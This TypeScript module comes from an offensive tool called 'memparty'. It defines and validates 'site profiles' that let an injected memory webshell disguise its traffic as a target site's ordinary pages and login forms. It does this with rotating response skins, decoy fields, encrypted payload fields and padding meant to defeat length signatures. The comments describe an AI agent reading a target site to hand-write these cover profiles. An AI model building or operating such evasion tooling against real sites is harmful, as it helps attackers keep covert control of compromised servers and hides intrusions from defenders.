/**
 * Site profiles — the mimic protocol's view of what a target site looks
 * like (see docs/custom-memshell-design.md).
 *
 * Profiles are written BY THE OPERATOR (or an AI agent), not crawled: a
 * dumb crawler can't judge which page makes the best cover, and in
 * practice the agent reads the site itself and hand-writes this JSON.
 * This module is only the store + schema:
 *
 *   - templates: one or more real response bodies (HTML/JSON/XML/JS…)
 *                used as response skins — the server rotates among them so
 *                responses don't all share one page's length/hash. A
 *                template carrying `{{payload}}` gets the ciphertext
 *                substituted exactly there (any format); an HTML template
 *                without it gets the marker fragment injected;
 *   - paths:     the site's path vocabulary, e.g. ["/api/", "/news/"],
 *                used for --dynamic-path request randomization.
 *
 * Legacy profiles with a single `template`/`title`/`contentType` triple
 * still load — they are normalized to a one-entry `templates` list.
 *
 * Store location: ~/.memparty/profiles/<name>.json (dir override with
 * MEMPARTY_PROFILES).
 */
import { existsSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

export interface ProfileTemplate {
  /** <title> of this page (metadata — the template is used verbatim). */
  title: string;
  /**
   * Full body of a real response on the site (a response skin). Any text
   * format is allowed — HTML, JSON, XML, JS… When it contains the literal
   * placeholder `{{payload}}`, the ciphertext is substituted exactly there
   * (works for every format); without a placeholder the template must be an
   * HTML page and the cipher's marker fragment is injected before </body>.
   */
  template: string;
  /** Content-Type this page is served with (the shell answers with it). */
  contentType: string;
  /** Relative rotation weight (default 1). */
  weight?: number;
}

/** One form field in the request shape. Values may contain {{hex:N}} placeholders. */
export interface ProfileFormField {
  name: string;
  value: string;
}

/**
 * How shell requests should look on the wire. Model it on a real form the
 * target site already receives all the time (e.g. its own login POST):
 * the ciphertext hides in `secretField`, surrounded by decoy fields.
 *
 * A profile may carry ONE of these or an ARRAY of them (`request: [...]`) —
 * the client picks one at random per request, so the request shape varies
 * the same way the response skins do.
 */
export interface ProfileRequest {
  /** Field that carries the ciphertext (e.g. "verCode"). */
  secretField: string;
  /** Where the ciphertext goes: form body (default), URL query, or a header. */
  secretIn?: "body" | "query" | "header";
  /**
   * Body serialization when secretIn=body: "form" (default, url-encoded) or
   * "json" (a JSON object with Content-Type application/json — for API sites
   * whose dominant traffic is JSON XHR). Ignored when bodyTemplate is set.
   */
  bodyStyle?: "form" | "json";
  /**
   * Full request body with the literal placeholder `{{payload}}` where the
   * ciphertext goes (takes precedence over bodyStyle; secretIn must be body).
   * Any text format — an OpenAI-style chat JSON, a GraphQL envelope, an XML
   * SOAP message, a multipart/form-data body (pair it with a Content-Type
   * header carrying the same boundary). Decoy macros {{hex:N}}, {{b64:N}},
   * {{uuid}}, {{ts}}, {{int:A:B}} are rendered per request.
   */
  bodyTemplate?: string;
  /** Decoy fields sent alongside (e.g. csrftoken/j_username/agreement). */
  fields?: ProfileFormField[];
  /** Extra/override request headers for this shape (e.g. Accept). */
  headers?: Record<string, string>;
  /** Relative rotation weight (default 1) when `request` is an array. */
  weight?: number;
}

/**
 * Infer the Content-Type a bodyTemplate implies when the shape doesn't set
 * one explicitly in headers. The client sends this CT and the custom build
 * derives the filter's body-read allowlist from the same inference — the
 * two sides must agree, hence one shared helper.
 */
export function inferBodyTemplateContentType(bodyTemplate: string): string | null {
  const t = bodyTemplate.trimStart();
  if (t.startsWith("--")) return "multipart/form-data";
  if (t.startsWith("{") || t.startsWith("[")) return "application/json";
  if (t.startsWith("<")) return "text/xml";
  return null;
}

/**
 * How the ciphertext is produced and hidden (the mimic codec menu).
 * All fields optional — a profile without `cipher` speaks the original
 * mimic wire format (aes-ecb + base64 + js-var marker).
 *
 * NOTE: the cipher is BAKED INTO the filter at `memparty custom build`
 * time. Editing it in the profile afterwards means the client and the
 * injected filter no longer match — rebuild and re-inject.
 */
export interface ProfileCipher {
  /** Cipher for the payload: AES/ECB (legacy), AES/CBC with random IV, or cyclic XOR. */
  algorithm?: "aes-ecb" | "aes-cbc" | "xor";
  /** Text encoding of the ciphertext bytes. */
  encoding?: "base64" | "base64url" | "hex";
  /**
   * Append key-derived-length (0-15) random alnum garbage after the encoded
   * ciphertext — Behinder's aes_with_magic trick against length signatures.
   */
  padTail?: boolean;
  /** How the response hides the ciphertext inside the cover page. */
  marker?: "js-var" | "html-comment";
}

export interface SiteProfile {
  name: string;
  /** Origin the profile describes, e.g. "http://192.0.2.1:8080". */
  site: string;
  createdAt: string;
  /** Response skins; the server rotates among them per response. */
  templates?: ProfileTemplate[];
  /** Legacy single-template fields — accepted on load, normalized by profileTemplates(). */
  title?: string;
  template?: string;
  contentType?: string;
  /** The site's path vocabulary, e.g. ["/api/", "/news/"]. */
  paths: string[];
  /** Request shape(s): one object, or an array the client rotates among. */
  request?: ProfileRequest | ProfileRequest[];
  /** Wire codec selection (baked into the filter at build time). */
  cipher?: ProfileCipher;
}

/** The effective template list: `templates[]` if present, else the legacy single triple. */
export function profileTemplates(profile: SiteProfile): ProfileTemplate[] {
  if (Array.isArray(profile.templates) && profile.templates.length > 0) {
    return profile.templates;
  }
  if (profile.template) {
    return [
      {
        title: profile.title ?? "",
        template: profile.template,
        contentType: profile.contentType ?? "text/html; charset=utf-8",
      },
    ];
  }
  return [];
}

/** The effective request-shape list (empty when the profile has none). */
export function profileRequests(profile: SiteProfile): ProfileRequest[] {
  if (!profile.request) return [];
  return Array.isArray(profile.request) ? profile.request : [profile.request];
}

/** Pick one request shape at random, honoring `weight` (default 1). */
export function pickRequestShape(requests: ProfileRequest[]): ProfileRequest | undefined {
  if (requests.length === 0) return undefined;
  const total = requests.reduce((s, r) => s + (r.weight ?? 1), 0);
  let roll = Math.random() * total;
  for (const r of requests) {
    roll -= r.weight ?? 1;
    if (roll <= 0) return r;
  }
  return requests[requests.length - 1]!;
}

const NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;

/** Where the ciphertext goes inside a cover template (any text format). */
export const PAYLOAD_PLACEHOLDER = "{{payload}}";

export function profilesDir(): string {
  const override = process.env.MEMPARTY_PROFILES;
  return override ? override : join(homedir(), ".memparty", "profiles");
}

export function profilePath(name: string): string {
  return join(profilesDir(), `${name}.json`);
}

/** Throw a descriptive error on any schema problem. */
export function validateProfile(profile: SiteProfile): void {
  if (!NAME_RE.test(profile.name)) {
    throw new Error(
      `invalid profile name ${JSON.stringify(profile.name)} — use letters, digits, '.', '_', '-'`,
    );
  }
  if (!profile.site || !/^https?:\/\//.test(profile.site)) {
    throw new Error(`profile.site must be an http(s) origin (got ${JSON.stringify(profile.site)})`);
  }
  const templates = profileTemplates(profile);
  if (templates.length === 0) {
    throw new Error("profile needs at least one template (templates[] or legacy template)");
  }
  templates.forEach((t, i) => {
    // a {{payload}} placeholder makes any text format usable; without it the
    // template must be an HTML page (the marker fragment needs </body>)
    if (!t.template || (!t.template.includes(PAYLOAD_PLACEHOLDER) && !/<!doctype\s+html|<html|<head/i.test(t.template))) {
      throw new Error(
        `templates[${i}].template must be a full HTML page, or carry the ${PAYLOAD_PLACEHOLDER} placeholder (any text format)`,
      );
    }
    if (!t.contentType) {
      throw new Error(`templates[${i}].contentType is required (e.g. "text/html; charset=utf-8")`);
    }
  });
  if (!Array.isArray(profile.paths)) {
    throw new Error("profile.paths must be an array (may be empty)");
  }
  for (const [ri, req] of profileRequests(profile).entries()) {
    if (!req.secretField || !/^[A-Za-z0-9_.-]+$/.test(req.secretField)) {
      throw new Error(`request[${ri}].secretField must be a form-field name`);
    }
    if (req.secretIn !== undefined && !["body", "query", "header"].includes(req.secretIn)) {
      throw new Error(`request[${ri}].secretIn must be body | query | header`);
    }
    if (req.bodyStyle !== undefined && !["form", "json"].includes(req.bodyStyle)) {
      throw new Error(`request[${ri}].bodyStyle must be form | json`);
    }
    if (req.bodyTemplate !== undefined) {
      if (!req.bodyTemplate.includes(PAYLOAD_PLACEHOLDER)) {
        throw new Error(`request[${ri}].bodyTemplate must carry the ${PAYLOAD_PLACEHOLDER} placeholder`);
      }
      if (req.secretIn !== undefined && req.secretIn !== "body") {
        throw new Error(`request[${ri}].bodyTemplate only applies to secretIn=body`);
      }
    }
    if (req.headers !== undefined) {
      for (const [k, v] of Object.entries(req.headers)) {
        if (typeof v !== "string" || !k) {
          throw new Error(`request[${ri}].headers must be a string map`);
        }
      }
    }
    for (const [i, f] of (req.fields ?? []).entries()) {
      if (!f.name || !/^[A-Za-z0-9_.-]+$/.test(f.name)) {
        throw new Error(`request[${ri}].fields[${i}].name must be a form-field name`);
      }
      if (f.name === req.secretField) {
        throw new Error(`request[${ri}].fields[${i}] duplicates secretField`);
      }
    }
  }
  if (profile.cipher !== undefined) {
    const c = profile.cipher;
    if (c.algorithm !== undefined && !["aes-ecb", "aes-cbc", "xor"].includes(c.algorithm)) {
      throw new Error(`cipher.algorithm must be aes-ecb | aes-cbc | xor (got ${JSON.stringify(c.algorithm)})`);
    }
    if (c.encoding !== undefined && !["base64", "base64url", "hex"].includes(c.encoding)) {
      throw new Error(`cipher.encoding must be base64 | base64url | hex (got ${JSON.stringify(c.encoding)})`);
    }
    if (c.marker !== undefined && !["js-var", "html-comment"].includes(c.marker)) {
      throw new Error(`cipher.marker must be js-var | html-comment (got ${JSON.stringify(c.marker)})`);
    }
    if (c.padTail !== undefined && typeof c.padTail !== "boolean") {
      throw new Error("cipher.padTail must be a boolean");
    }
  }
}

export function saveProfile(profile: SiteProfile): void {
  validateProfile(profile);
  const dir = profilesDir();
  mkdirSync(dir, { recursive: true });
  writeFileSync(profilePath(profile.name), `${JSON.stringify(profile, null, 2)}\n`, "utf8");
}

export function loadProfile(name: string): SiteProfile {
  const path = profilePath(name);
  if (!existsSync(path)) {
    throw new Error(
      `unknown profile ${JSON.stringify(name)} — scaffold one with 'memparty profile init ${name} --site <origin>' ` +
        `and fill in the template/paths by hand (stored: ${listProfiles().join(", ") || "(none)"})`,
    );
  }
  const profile = JSON.parse(readFileSync(path, "utf8")) as SiteProfile;
  validateProfile(profile);
  return profile;
}

export function listProfiles(): string[] {
  const dir = profilesDir();
  if (!existsSync(dir)) return [];
  return readdirSync(dir)
    .filter((f) => f.endsWith(".json"))
    .map((f) => f.slice(0, -".json".length))
    .sort();
}

/** An empty-but-valid skeleton for hand-authoring (`memparty profile init`). */
export function profileSkeleton(name: string, site: string): SiteProfile {
  return {
    name,
    site: site.replace(/\/+$/, ""),
    createdAt: new Date().toISOString(),
    templates: [
      {
        title: "",
        template: "<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title></title>\n</head>\n<body>\n</body>\n</html>\n",
        contentType: "text/html; charset=utf-8",
      },
    ],
    paths: [],
  };
}
